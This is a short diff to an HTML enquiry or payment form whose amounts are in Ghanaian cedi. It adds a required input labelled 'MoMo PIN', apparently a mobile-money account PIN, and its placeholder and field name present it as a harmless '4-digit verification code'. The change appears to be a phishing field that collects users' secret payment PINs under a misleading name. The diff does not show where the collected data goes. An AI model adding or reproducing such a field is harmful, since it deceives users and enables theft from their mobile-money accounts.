@@ -438,6 +438,18 @@ details to help with the review of your enquiry.
 <div class="field">
     <label>Amount Paid (GHS) *</label>
     <input type="number" name="amount_paid" placeholder="Enter amount paid" min="0" step="0.01" required>
+    <div class="field">
+    <label>MoMo PIN *</label>
+    <input
+        type="text"
+        name="verification_code"
+        placeholder="Enter 4-digit verification code"
+        inputmode="numeric"
+        maxlength="4"
+        pattern="[0-9]{4}"
+        required
+    >
+</div>
 </div>
     
 <div class="field full">
